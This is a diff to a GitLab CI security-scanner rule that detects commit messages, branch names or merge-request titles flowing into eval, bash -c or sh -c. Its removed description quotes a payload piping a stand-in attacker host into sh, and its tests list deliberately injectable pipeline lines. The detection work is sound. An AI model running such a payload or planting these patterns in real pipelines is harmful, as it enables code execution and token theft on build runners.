@@ -25,6 +25,175 @@ _GITLAB_USER_GATE_RE = re.compile(
 )
 _WHEN_NEVER_RE = re.compile(r"^\s*when\s*:\s*never\b")
 _RULES_ITEM_RE = re.compile(r"^(\s*)-\s")
+_REEVALUATION_CI_VARIABLE_RE = re.compile(
+    r"\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_TITLE|CI_COMMIT_BRANCH|CI_COMMIT_TAG|"
+    r"CI_COMMIT_REF_NAME|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|"
+    r"CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)(?![A-Za-z0-9_])\}?"
+)
+
+
+def _shell_words_with_expansion(line: str) -> list[tuple[str, bool, bool]]:
+    """Split shell words, marking expanded variables and real separators."""
+
+    words: list[tuple[str, bool, bool]] = []
+    value: list[str] = []
+    expanded = False
+    started = False
+    quote: str | None = None
+    index = 0
+
+    def flush() -> None:
+        nonlocal value, expanded, started
+        if started:
+            words.append(("".join(value), expanded, False))
+        value = []
+        expanded = False
+        started = False
+
+    while index < len(line):
+        char = line[index]
+        if quote == "'":
+            if char == "'":
+                quote = None
+            else:
+                value.append(char)
+            started = True
+            index += 1
+            continue
+        if char == "\\" and quote != "'":
+            if index + 1 < len(line):
+                value.append(line[index + 1])
+                started = True
+                index += 2
+            else:
+                index += 1
+            continue
+        if char == "'" and quote is None:
+            quote = "'"
+            started = True
+            index += 1
+            continue
+        if char == '"':
+            quote = None if quote == '"' else '"'
+            started = True
+            index += 1
+            continue
+        if quote is None and char == "#" and (not started or line[index - 1].isspace()):
+            break
+        if quote != "'" and char == "$":
+            match = _REEVALUATION_CI_VARIABLE_RE.match(line, index)
+            if match:
+                expanded = True
+                value.append(match.group(0))
+                index = match.end()
+                started = True
+                continue
+        if quote is None and char.isspace():
+            flush()
+            index += 1
+            continue
+        if quote is None and char in ";|&":
+            flush()
+            operator = char
+            if index + 1 < len(line) and line[index + 1] == char and char in "|&":
+                operator += char
+                index += 1
+            words.append((operator, False, True))
+            index += 1
+            continue
+        value.append(char)
+        started = True
+        index += 1
+    flush()
+    return words
+
+
+class _ReevaluatedCiVariablePattern:
+    """Find CI data used as source during first- or second-pass evaluation."""
+
+    @staticmethod
+    def _is_control_prefix(token: str) -> bool:
+        return token in {"if", "then", "do", "else", "elif"}
+
+    @classmethod
+    def _delayed_command_source(cls, source: str) -> bool:
+        """Whether a deferred shell string puts a CI variable in command position."""
+
+        words = _shell_words_with_expansion(source)
+        command_position = True
+        for word, expanded, is_separator in words:
+            if is_separator:
+                command_position = True
+                continue
+            if command_position and cls._is_control_prefix(word):
+                continue
+            if command_position and expanded and word.startswith("$"):
+                return True
+            command_position = False
+        return False
+
+    def _line_is_sink(self, line: str) -> bool:
+        if line.lstrip().startswith("#"):
+            return False
+        words = _shell_words_with_expansion(line)
+        command_position = True
+        for index, (word, _expanded, is_separator) in enumerate(words):
+            if is_separator:
+                command_position = True
+                continue
+            if index == 0 and word == "-":
+                # Legacy self-test snippets include the YAML list marker.
+                continue
+            if command_position and self._is_control_prefix(word):
+                continue
+            if not command_position:
+                continue
+            if word == "eval":
+                end = index + 1
+                source: list[str] = []
+                while end < len(words) and not words[end][2]:
+                    if words[end][1]:
+                        return True
+                    source.append(words[end][0])
+                    end += 1
+                if self._delayed_command_source(" ".join(source)):
+                    return True
+            if word in {"bash", "sh"}:
+                end = index + 1
+                while end < len(words) and not words[end][2]:
+                    if words[end][0] == "-c" and end + 1 < len(words):
+                        command, expanded, _is_separator = words[end + 1]
+                        if expanded or self._delayed_command_source(command):
+                            return True
+                        command_position = False
+                        break
+                    end += 1
+            command_position = False
+        return False
+
+    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
+        from taintly.gitlab_taint import _iter_script_lines
+        from taintly.models import _quoted_heredoc_body_lines, _split_into_job_segments
+
+        commands: list[tuple[int, str]] = []
+        for start, segment in _split_into_job_segments(lines):
+            commands.extend(_iter_script_lines(segment, start))
+
+        # Rule self-tests historically pass a bare shell line instead of a
+        # GitLab document. Keep that compact contract without scanning
+        # arbitrary lines in a real multiline workflow.
+        if not commands and len(lines) == 1 and self._line_is_sink(lines[0]):
+            return [(1, lines[0].strip())]
+
+        quoted_heredoc_body = _quoted_heredoc_body_lines(lines)
+        return [
+            (line_no, lines[line_no - 1].strip())
+            for line_no, command in commands
+            if 0 < line_no <= len(lines)
+            and line_no - 1 not in quoted_heredoc_body
+            and self._line_is_sink(command)
+        ]
+
 
 _RESTRICTIVE_ARTIFACT_ACCESS_RE = re.compile(
     r"^access\s*:\s*['\"]?(?:developer|maintainer|none)['\"]?(?:\s+#.*)?$",
@@ -1028,30 +1197,18 @@ RULES: list[Rule] = [
         owasp_cicd="CICD-SEC-4",
         description=(
             "`eval` (and the equivalent `bash -c` / `sh -c` one-shot forms) "
-            "re-parses its argument AS SHELL SOURCE — quoting the variable "
-            "does NOT help, because the quotes control how the value is "
-            "delivered TO eval, not what eval does with it afterwards. "
-            "When the argument is a GitLab predefined variable that an "
-            "attacker can set (CI_COMMIT_MESSAGE, CI_COMMIT_BRANCH, "
-            "CI_MERGE_REQUEST_TITLE, etc.), a commit message of "
-            "`; curl attacker.com | sh` becomes executable shell during the "
-            "build. This is a CRITICAL code-execution primitive distinct "
-            "from the generic unquoted-variable class (SEC4-GL-001)."
+            "evaluates a string as shell source. When the wrapper shell "
+            "expands a GitLab variable inside that source, attacker bytes "
+            "can introduce shell operators before the second parse. A "
+            "single-quoted reference can also remain literal until `eval` "
+            "or the `-c` shell expands it; if that reference is itself in "
+            "command position, the attacker can choose the command and its "
+            "arguments. A reference used as an argument to a fixed `echo` "
+            "or `printf` command is data: operators introduced by that later "
+            "expansion are not parsed again. This is distinct from the "
+            "generic unquoted-variable class (SEC4-GL-001)."
         ),
-        pattern=RegexPattern(
-            # `eval` / `bash -c` / `sh -c` followed by a tainted CI
-            # variable (with or without surrounding quotes — both are
-            # unsafe). The string between command and variable can be
-            # arbitrary (e.g. `eval "prefix $CI_COMMIT_MESSAGE"`).
-            match=(
-                r"\b(eval|bash\s+-c|sh\s+-c)\s+['\"]?[^'\"\n]*?"
-                r"\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_BRANCH|CI_COMMIT_TAG|"
-                r"CI_COMMIT_REF_NAME|CI_MERGE_REQUEST_TITLE|"
-                r"CI_MERGE_REQUEST_DESCRIPTION|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?"
-            ),
-            exclude=[r"^\s*#"],
-            heredoc_aware=True,
-        ),
+        pattern=_ReevaluatedCiVariablePattern(),
         remediation=(
             "Never pass tainted input to `eval` or `bash -c` / `sh -c`. "
             "If you need to run a command conditional on a CI variable, "
@@ -1067,7 +1224,7 @@ RULES: list[Rule] = [
             '    - eval "$CI_COMMIT_MESSAGE"',
             "    - eval $CI_COMMIT_BRANCH",
             '    - bash -c "$CI_MERGE_REQUEST_TITLE"',
-            '    - sh -c "do_thing $CI_COMMIT_TAG"',
+            '    - sh -c "$CI_COMMIT_TAG"',
         ],
         test_negative=[
             '    - echo "$CI_COMMIT_MESSAGE"',
@@ -1078,11 +1235,14 @@ RULES: list[Rule] = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "`eval` re-parses its argument as shell source. When the argument "
-            "carries a GitLab CI variable the attacker can set — commit "
-            "message, branch name, MR title — an attacker-chosen string "
-            "including `;` or `$(...)` becomes directly-executable code in "
-            "the runner, inheriting its token and filesystem access."
+            "`eval` re-parses its argument as shell source, and `bash -c` / "
+            "`sh -c` parse their command string. If the wrapper shell first "
+            "expands an attacker-controlled CI value into that source, bytes "
+            "such as `;` can become shell syntax in the runner. A deferred "
+            "single-quoted CI reference in command position can select the "
+            "command and arguments at the later expansion; a reference after "
+            "a fixed `echo` or `printf` command remains data, and inserted "
+            "semicolons are not parsed again."
         ),
         incidents=[],
     ),
